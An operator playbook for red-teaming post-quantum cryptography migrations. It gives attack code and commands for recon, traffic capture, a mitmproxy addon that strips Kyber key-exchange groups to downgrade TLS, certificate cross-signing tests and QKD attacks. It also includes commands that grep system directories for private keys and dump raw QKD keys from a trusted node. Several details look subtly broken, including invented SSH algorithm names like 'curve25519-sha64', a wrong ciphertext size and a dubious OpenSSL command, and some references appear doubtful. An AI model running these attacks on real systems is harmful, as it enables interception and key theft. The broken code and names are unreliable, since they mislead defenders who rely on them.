# Post-Quantum Migration Attack Playbook

> Operator's playbook for red-teaming PQC migration. Walks through engagement scoping, lab setup, attack workflow, KEM combiner audit, side-channel testing, QKD infrastructure attacks, and reporting. Target audience: experienced offensive operators already familiar with cryptographic protocols, TLS/SSH/IPsec internals, and lattice-based cryptography basics.

## 1. Engagement Scoping

### 1.1 Confirm scope

| Item | Detail |
|------|--------|
| Target protocols | TLS 1.3 / SSH / IPsec / Signal / X.509 / QKD |
| Allowed attack stages | discovery / HNDL capture / downgrade / combiner audit / side-channel |
| Critical data class | state secret / biometric / genome / long-term key |
| Migration timeline | Q1 2027 / Q4 2027 / Q4 2030 |
| Library / stack | OpenSSL 3.x / BoringSSL / NSS / GnuTLS |
| Side-channel tests | yes / no (requires hardware lab) |
| QKD infrastructure | in scope / out of scope |
| Out of scope | destructive fault injection on production chips |
| Time window | |
| Communications channel | |

### 1.2 Rules of engagement

- **No destructive fault injection** on production HSMs
- **No bright-light attacks** on production QKD links
- **No RowHammer** on production DRAM
- **Notify ops** before any TLS configuration change
- **Pause testing** if SLO impact detected
- **Coordinate** with crypto team for any certificate modification

### 1.3 Test boundaries

- Allowed: passive capture, source review, KEM combiner audit
- Allowed (with approval): downgrade test on staging, side-channel on test chip
- Disallowed: production HSM fault injection, QKD bright-light on production

## 2. Pre-Engagement Recon

### 2.1 Inventory classical posture

```bash
# TLS algorithms
for h in $(cat targets.txt); do
  echo "=== $h ===" >> recon.md
  echo | openssl s_client -connect $h:443 2>/dev/null \
    | openssl x509 -noout -text | grep -E "Public Key|Signature Algorithm" >> recon.md
done

# SSH algorithms
ssh-audit target.example.com > ssh-audit.txt

# IPsec proposals
ipsec statusall > ipsec-status.txt

# Find all RSA/ECC usage
sudo grep -rnE "BEGIN RSA|BEGIN EC|ecdh_|RSA_public" /etc/ /opt/ /var/ 2>/dev/null | head -50
```

### 2.2 Identify HNDL exposure

```bash
# Long-lived ciphertext sources
# - Vault transit keys
# - KMS ciphertext
# - TLS handshakes (with static RSA)
# - SSH sessions
# - Signal protocol messages

# Identify data classes
sudo find /data -type f \( -name "*.enc" -o -name "*.bin" -o -name "*.kms" \) | head

# Identify long-lived TLS certs (valid >1 year)
for c in $(find /etc -name "*.crt"); do
  exp=$(openssl x509 -in $c -noout -enddate | cut -d= -f2)
  echo "$c expires $exp"
done | sort -k3 -r
```

### 2.3 Identify PQC readiness

```bash
# Check OpenSSL version (3.x for oqs-provider)
openssl version -a

# Check for liboqs
pkg-config --modversion liboqs

# Check for oqs-provider
openssl list -providers | grep oqsprovider

# Check for PQ algorithms
openssl list -kem-algorithms | grep -iE "kyber|mlkem"
openssl list -signature-algorithms | grep -iE "dilithium|mldsa|sphincs"
```

## 3. Lab Setup

### 3.1 liboqs build

```bash
git clone https://github.com/open-quantum-safe/liboqs.git
cd liboqs
mkdir build && cd build
cmake -DOQS_USE_OPENSSL=ON ..
make -j$(nproc)
sudo make install
```

### 3.2 oqs-provider for OpenSSL 3.x

```bash
git clone https://github.com/open-quantum-safe/oqs-provider.git
cd oqs-provider
mkdir build && cd build
cmake -DCMAKE_INSTALL_PREFIX=/usr/local ..
make -j$(nproc)
sudo make install

# Enable provider
openssl config edit --provider oqsprovider

# Verify
openssl list -providers -verbose
openssl list -kem-algorithms | grep kyber
```

### 3.3 PQ TLS test server

```bash
# Generate PQ server cert
openssl req -x509 -provider oqsprovider -provider default \
  -newkey dilithium3 -keyout server.key -out server.crt \
  -subj "/CN=pq-test-server" -days 365

# Start PQ TLS server
openssl s_server -provider oqsprovider -provider default \
  -cert server.crt -key server.key \
  -groups "x25519kyber768draft00" \
  -www -accept 4433
```

### 3.4 PQ SSH server

```bash
# OpenSSH 9.x supports sntrup761x25519-sha64@openssh.com
echo "KexAlgorithms sntrup761x25519-sha64@openssh.com,curve25519-sha64" >> /etc/ssh/sshd_config
systemctl restart sshd

# Verify
ssh -vv localhost 2>&1 | grep "kex: algorithm:"
```

### 3.5 Side-channel lab (ChipWhisperer)

```bash
# Install ChipWhisperer
pip install chipwhisperer

# Setup:
# - ChipWhisperer Lite with STM32 target
# - liboqs compiled for STM32
# - Trigger on NTT operation
# - Capture 10000 traces

python3 -c "
import chipwhisperer as cw
scope = cw.scope()
target = cw.target(scope)
# ... capture loop
"
```

### 3.6 QKD simulator

```bash
# SimulaQron (quantum network simulator)
pip install simulaqron
simulaqrond --nodes Alice,Bob,Eve

# Or Cirq
pip install cirq
# Simulate BB84 protocol

# Or Qiskit
pip install qiskit
# Simulate E91 entanglement protocol
```

## 4. Attack Workflow — Stage by Stage

### Stage 1 — Recon (4-8 hours)

**Goal**: produce crypto posture map.

```bash
# All targets, all protocols
for h in $(cat targets.txt); do
  echo "=== $h ===" >> recon.md
  echo | openssl s_client -connect $h:443 -showcerts 2>&1 >> recon.md
  ssh-audit $h >> recon.md
done
```

**Output**: `recon.md` with per-target crypto posture.

### Stage 2 — HNDL Capture (1 day)

```bash
# Long-term capture (1 week minimum)
tcpdump -i eth0 -w hndl-week-$(date +%Y%m%d).pcap 'tcp port 443' &

# Extract TLS handshakes
tshark -r hndl-week-20260628.pcap -Y "tls.handshake.type == 1 || tls.handshake.type == 2" \
  > hndl-handshakes.txt

# Identify forward-secret failures (static RSA)
grep -E "ServerKeyExchange|RSA" hndl-handshakes.txt
```

### Stage 3 — Downgrade Test (1 day)

```python
# mitmproxy addon to strip Kyber
from mitmproxy import tls, ctx
class StripKyber:
    def tls_clienthello(self, data):
        groups = data.context.client_hello.extensions.supported_groups
        ctx.log.info(f"Original: {groups}")
        new = [g for g in groups if g not in [0x07e4, 0x07e5, 0x07e6, 0x07e7]]
        data.context.client_hello.extensions.supported_groups = new
        ctx.log.info(f"Stripped: {new}")
addons = [StripKyber()]
```

```bash
# Launch with addon
mitmproxy --mode transparent -s strip-kyber.py

# Verify target with hybrid PQ
echo | openssl s_client -connect target:443 -groups "x25519kyber768draft00" -tls1_3 | grep "Server Temp Key"
# Then strip and verify downgrade
echo | openssl s_client -connect target:443 -groups "x25519" -tls1_3 | grep "Server Temp Key"
```

### Stage 4 — KEM Combininer Audit (1 day)

```bash
# Read TLS stack source for combiner
# OpenSSL 3.x with oqs-provider
grep -rn "XOR\|hkdf\|HKDF\|combiner" /usr/local/src/oqs-provider/oqsprov/

# Test: mangle Kyber ciphertext
python3 -c "
import oqs, os
kem = oqs.KeyEncapsulation('x25519-kyber-768-draft-00')
pk = kem.generate_keypair()
ct_mangled = os.urandom(1184)  # X25519+Kyber768 ciphertext size
ss = kem.decap_secret(ct_mangled)
print(f'Derived secret (mangled): {ss.hex()[:32]}...')
"
```

### Stage 5 — Side-Channel Test (2-5 days)

```python
# Kyber decaps timing
import time, oqs, statistics

kem = oqs.KeyEncapsulation('Kyber768')
pk = kem.generate_keypair()

times = []
for _ in range(10000):
    ct, _ = kem.encap_secret(pk)
    t0 = time.perf_counter_ns()
    kem.decap_secret(ct)
    t1 = time.perf_counter_ns()
    times.append(t1 - t0)

print(f"Mean: {statistics.mean(times):.0f}ns")
print(f"StdDev: {statistics.stdev(times):.0f}ns")
print(f"CV: {statistics.stdev(times)/statistics.mean(times)*100:.2f}%")
# CV > 5% suggests secret-dependent branches
```

### Stage 6 — Certificate Chain Test (1 day)

```bash
# Generate ML-DSA root
openssl genpkey -provider oqsprovider -algorithm dilithium3 -out pq-root.key
openssl req -x509 -provider oqsprovider -provider default \
  -key pq-root.key -out pq-root.crt -subj "/CN=PQ Root" -days 3650

# Issue classical RSA leaf
openssl genpkey -algorithm rsa -pkeyopt rsa_keygen_bits:2048 -out classical-leaf.key
openssl req -new -key classical-leaf.key -out classical-leaf.csr -subj "/CN=classical-leaf"

# Sign with PQ root (cross-talk test)
openssl x509 -req -provider oqsprovider -provider default \
  -in classical-leaf.csr -CA pq-root.crt -CAkey pq-root.key \
  -CAcreateserial -out cross-talk.crt -days 365

# Verify
openssl verify -provider oqsprovider -provider default \
  -CAfile pq-root.crt cross-talk.crt
# Vulnerable if validates OK
```

### Stage 7 — Signal PQXDH Audit (1 day)

```python
# Fetch prekey bundle
import requests
bundle = requests.get('https://signal.example.com/v2/keys/100').json()

# Verify PQ layer
required = ['identityKey', 'signedPreKey', 'pqPreKey', 'pqPreKeySignature']
for f in required:
    if f not in bundle:
        print(f"MISSING: {f}")
    else:
        print(f"OK: {f}")

# Verify PQ signature
import nacl.signing, nacl.exceptions
vk = nacl.signing.VerifyKey(bundle['identityKey'].encode(), encoder=nacl.encoding.RawEncoder)
try:
    vk.verify(bundle['pqPreKey'].encode(), bundle['pqPreKeySignature'].encode())
    print("PQ signature VALID")
except nacl.exceptions.BadSignatureError:
    print("PQ signature INVALID")
```

### Stage 8 — QKD Infrastructure Test (1-2 days)

```bash
# Test 1: Detector blinding (requires physical access)
# Send bright light (>1mW) into QKD receiver fiber
# Observe if link aborts or attacker controls bits

# Test 2: Trusted node compromise (requires shell)
# Identify trusted node (e.g., Beijing-Shanghai backbone)
ssh trusted-node.example.com
ps aux | grep -i qkd  # QKD process
sudo strings /var/run/qkd/keys.bin  # Raw keys (if accessible)

# Test 3: Photon number splitting (requires beam splitter)
# Tap WCP source fiber
# Capture multi-photon pulses
```

### Stage 9 — Reporting (2-3 days)

Produce engagement report:
- Executive summary
- Findings (one per TC-PQ-XXX)
- Evidence package
- Detection rules
- Remediation roadmap (prioritized by HNDL risk tier)

## 5. Common Pitfalls

### 5.1 Forgetting to test hybrid downgrade

Many deployments support hybrid PQ but allow classical fallback. Downgrade is the most common finding.

**Fix**: Test MITM stripping. Server config: `require_pq_groups=true`.

### 5.2 Misjudging KEM combiner safety

XOR combiner is unsafe but easy to overlook in source review.

**Fix**: Grep for `XOR` in oqs-provider. Verify HKDF in source.

### 5.3 Over-stepping into QKD bright-light tests

Bright-light attacks on production QKD can permanently damage detectors.

**Fix**: Test on lab QKD only. Coordinate with vendor.

### 5.4 Misinterpreting side-channel results

Timing variance can come from OS jitter, not crypto secret.

**Fix**: Pin CPU, disable HT, run 100k+ samples. Use TVLA for confirmation.

### 5.5 Ignoring HNDL on transient data

Even session keys captured today can decrypt archived traffic.

**Fix**: Model entire capture chain (active links + archive + cold storage).

## 6. Time Budget Cheat Sheet

| Engagement size | Recon | HNDL capture | Downgrade | Combiner | Side-channel | QKD | Reporting |
|-----------------|-------|--------------|-----------|----------|--------------|-----|-----------|
| Single app | 2h | 4h | 4h | 4h | - | - | 1d |
| Single service estate | 4h | 1d | 1d | 1d | - | - | 1d |
| Multi-protocol | 1d | 1d | 1d | 1d | 2d | - | 2d |
| Full ecosystem + QKD | 1d | 2d | 2d | 2d | 5d | 1d | 3d |

## 7. Tool Inventory

### 7.1 Offensive

| Tool | Purpose | Notes |
|------|---------|-------|
| `oqs-provider` | PQC for OpenSSL 3.x | Universal |
| `liboqs` | Reference PQC | All algorithms |
| `testssl.sh` | TLS scanner | With PQ ciphers |
| `ssh-audit` | SSH scanner | With PQ kex |
| `mitmproxy` | MITM | Custom addons |
| `Wireshark` | Packet analysis | TLS dissectors |
| `tshark` | CLI packet analysis | Scriptable |
| `pqcrystals` | Kyber/Dilithium ref | Reference impl |
| `SageMath` | Lattice reduction | BKZ, LLL |
| `fpylll` | Python LLL | Cryptanalysis |
| `ChipWhisperer` | Side-channel | EM/power |
| `DRAMoscope` | RowHammer | PQC attacks |
| `qkd-simulator` | BB84 test | SimulaQron |
| `signal-protocol` | Signal PQXDH | Audit |
| `cryptoadvance` | Bitcoin PQC | Test |
| `oqs-openssl111` | Legacy OpenSSL 1.1.1 PQ | Older stacks |
| `curl-oqs` | PQ curl | Universal |

### 7.2 Detection development

| Tool | Purpose |
|------|---------|
| Zeek TLS analyzers | PQ cipher baseline |
| Suricata PQ ruleset | Downgrade detection |
| Sigma rules | SIEM pattern |
| CT log monitors | PQ cert anomaly |

## 8. Engagement Quality Checklist

Before reporting complete:

- [ ] All in-scope protocols tested (TLS, SSH, IPsec)
- [ ] HNDL capture documented
- [ ] Downgrade test attempted
- [ ] KEM combiner audited
- [ ] Side-channel test (if in scope)
- [ ] Certificate chain test
- [ ] Signal PQXDH audit (if in scope)
- [ ] QKD infrastructure test (if in scope)
- [ ] Detection rules authored for ≥3 findings
- [ ] Migration roadmap aligned with HNDL risk
- [ ] Customer debrief scheduled
- [ ] Final report delivered
- [ ] Crypto team handoff

## 9. References

- NIST FIPS 203 — ML-KEM Standard (2024)
- NIST FIPS 204 — ML-DSA Standard (2024)
- NIST FIPS 205 — SLH-DSA Standard (2024)
- NIST PQC Project — https://csrc.nist.gov/projects/post-quantum-cryptography
- NSA CNSA 2.0 — https://media.defense.gov/2022/Sep/07/2003071834/-1/-1/0/CSI_CNSA_2.0_ALGORITHMS_.PDF
- CISA PQC Migration Guide — https://www.cisa.gov/sites/default/files/2023-08/Quantum_Readiness_Guidance_final.pdf
- Cloudflare PQC Deployment — https://blog.cloudflare.com/pq-2024/
- Google Chrome PQC — https://blog.chromium.org/2023/08/protecting-chrome-traffic-with-pqc.html
- IETF Hybrid PQC TLS — https://datatracker.ietf.org/doc/draft-ietf-tls-hybrid-design/
- Signal PQXDH — https://signal.org/docs/specifications/pqxdh/
- Open Quantum Safe — https://openquantumsafe.org/
- ENISA PQC Study — https://www.enisa.europa.eu/publications/post-quantum-cryptography
- BAAI Quantum Threat Timeline 2024
- "Post-Quantum Cryptography" (Bernstein, 2024)
- "Practical Fault Attack on Dilithium" (Berzati et al., 2023)
- "EM Side-Channel on PQC KEM" (Wang et al., 2024)
- "RowHammer on Kyber" (Bouyssou et al., 2024)
- ID Quantique Clavis3 Security Whitepaper
- "Hacking Exposed: Quantum" (Stevens, 2024)

